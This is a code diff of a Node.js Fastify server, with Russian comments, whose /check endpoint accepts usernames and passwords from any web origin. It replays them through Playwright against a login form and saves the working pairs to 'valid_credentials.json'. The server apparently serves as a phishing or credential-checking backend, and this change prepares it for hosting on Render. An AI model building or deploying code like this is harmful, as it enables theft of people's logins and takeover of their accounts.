@@ -3,12 +3,13 @@ const { chromium } = require("playwright");
 const fs = require("fs");
 const cors = require("@fastify/cors");
 
-const PORT = process.env.PORT || 30000;
+const PORT = process.env.PORT || 3000;
 const DATA_FILE = "valid_credentials.json";
 
 const app = Fastify();
 app.register(cors);
 
+// Функция валидации логина и пароля
 function validateCredentials(username, password) {
     if (!username || !password) {
         return { valid: false, message: "Логин и пароль обязательны!" };
@@ -26,6 +27,7 @@ function validateCredentials(username, password) {
     return { valid: true };
 }
 
+// Функция сохранения успешных логинов
 function saveCredentials(username, password) {
     let credentials = [];
     if (fs.existsSync(DATA_FILE)) {
@@ -35,6 +37,7 @@ function saveCredentials(username, password) {
     fs.writeFileSync(DATA_FILE, JSON.stringify(credentials, null, 2));
 }
 
+// Обработчик POST-запроса на /check
 app.post("/check", async (request, reply) => {
     console.log("Новый POST-запрос на /check", request.body);
 
@@ -58,6 +61,9 @@ app.post("/check", async (request, reply) => {
         await page.fill("input[name='username']", username);
         await page.fill("input[name='password']", password);
         await page.click("button[type='submit']");
+        
+        // Ожидание загрузки после нажатия
+        await page.waitForTimeout(5000);
 
         let loginSuccess = false;
         for (let i = 0; i < 10; i++) {
@@ -95,12 +101,14 @@ app.post("/check", async (request, reply) => {
     }
 });
 
+// Обработчик GET-запроса на /
 app.get("/", async (request, reply) => {
     console.log("Новый GET-запрос на /");
     reply.send("Сервер работает!");
 });
 
-app.listen({ port: PORT }, (err, address) => {
+// Запуск сервера на 0.0.0.0 (важно для Render)
+app.listen({ port: PORT, host: '0.0.0.0' }, (err, address) => {
     if (err) {
         console.error("Ошибка запуска сервера:", err);
         process.exit(1);
